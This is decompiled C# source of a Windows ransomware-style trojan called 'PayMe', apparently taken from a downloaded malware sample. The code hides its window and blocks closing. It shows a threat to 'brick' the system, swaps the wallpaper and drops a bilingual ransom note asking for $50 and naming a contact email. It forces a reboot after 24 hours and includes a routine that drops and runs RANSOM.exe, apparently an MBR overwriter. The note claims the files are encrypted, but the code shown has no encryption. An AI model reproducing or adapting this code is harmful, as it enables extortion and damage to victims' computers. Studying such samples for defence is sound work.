// Decompiled with JetBrains decompiler
// Type: PayMe.Form1
// Assembly: PayMe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 298F59B2-D782-4C3E-9335-E4B1935CDF6B
// Assembly location: C:\Users\Administrateur\Downloads\UDS-Trojan.MSIL.DiskWriter.gen-4410111ba794c46861f4fbfce06d6c8a790582d0fdd7fbe070f30b0cee93e2a6.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace PayMe
{
  public class Form1 : Form
  {
    private const int SPI_SETDESKWALLPAPER = 20;
    private const int SPIF_UPDATEINIFILE = 1;
    private const int SPIF_SENDWININICHANGE = 2;
    private IContainer components = (IContainer) null;
    private Timer tmr_out;

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      int uAction,
      int uParam,
      string lpvParam,
      int fuWinIni);

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
      this.tmr_out.Start();
      int num = (int) MessageBox.Show("You only have 24 hours to complete the payment, if the payment isn't made by tomorrow night, we'l brick your entire system", "PayMe", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      string resourceName = "a.png";
      Form1.Extract("PayMe", AppDomain.CurrentDomain.BaseDirectory, "Resources", resourceName);
      Form1.changeWallpaper(AppDomain.CurrentDomain.BaseDirectory + resourceName);
      this.dropRansomLetter();
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e) => e.Cancel = true;

    public static void Extract(
      string nameSpace,
      string outDirectory,
      string internalFilePath,
      string resourceName)
    {
      using (Stream manifestResourceStream = Assembly.GetCallingAssembly().GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
      {
        using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
        {
          using (FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
          {
            using (BinaryWriter binaryWriter = new BinaryWriter((Stream) output))
              binaryWriter.Write(binaryReader.ReadBytes((int) manifestResourceStream.Length));
          }
        }
      }
    }

    private static void changeWallpaper(string filename)
    {
      try
      {
        Form1.SystemParametersInfo(20, 1, filename, 1);
      }
      catch (Exception ex)
      {
      }
    }

    private void dropRansomLetter()
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
      using (StreamWriter text = File.CreateText(folderPath + "\\PayMe_Decryptor.txt"))
      {
        text.WriteLine("+------------------------English-------------------------+");
        text.WriteLine("Your important data is being encrypted, with a special encryption software. It is certainly impossible for you to recover your data without");
        text.WriteLine("a private decryption Key, to purchase it, follow the steps below, carefulLy, without skipping any! Perhaps you are busy");
        text.WriteLine("looking for a way to recover your data, but do not waste your time, nobody can recover your files without our Help!");
        text.WriteLine("1. Send us $50 to our PayPal: *PayPal later*");
        text.WriteLine("2. E-mail danielnusradin@gmail.com a sreenshot of your submitted payment...");
        text.WriteLine("3. You should receive a file containing a decryption Software, use it decrypt your data, and continue on using your PC.");
        text.WriteLine("+------------------------Russian-------------------------+");
        text.WriteLine("Ваши важные данные шифруются специальным программным обеспечением для шифрования. Конечно, вы не сможете восстановить свои данные без");
        text.WriteLine("приватный ключ дешифрования, чтобы приобрести его, внимательно следуйте приведенным ниже шагам, не пропуская ни одного! Возможно, вы заняты");
        text.WriteLine("ищите способ восстановить ваши данные, но не тратьте время зря, никто не сможет восстановить ваши файлы без нашей помощи!");
        text.WriteLine("1. Отправьте нам 50 долларов на наш PayPal: *PayPal позже*");
        text.WriteLine("2. Отправьте на danielnusradin@gmail.com скриншот отправленного платежа...");
        text.WriteLine("3. Вы должны получить файл, содержащий программное обеспечение для расшифровки, использовать его для расшифровки ваших данных и продолжать использовать свой компьютер.");
      }
      Process.Start(folderPath + "\\PayMe_Decryptor.txt");
    }

    private void overwriteMBR()
    {
      Form1.Extract("PayMe", "C:\\Windows", "Resources", "RANSOM.exe");
      Process.Start("C:\\\\Windows\\\\RANSOM.exe");
    }

    private void tmr_out_Tick(object sender, EventArgs e)
    {
      this.tmr_out.Stop();
      Process.Start(new ProcessStartInfo("shutdown", "/r /t 0")
      {
        CreateNoWindow = true,
        UseShellExecute = false
      });
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.tmr_out = new Timer(this.components);
      this.SuspendLayout();
      this.tmr_out.Interval = 86400000;
      this.tmr_out.Tick += new EventHandler(this.tmr_out_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(169, 56);
      this.ControlBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }
  }
}
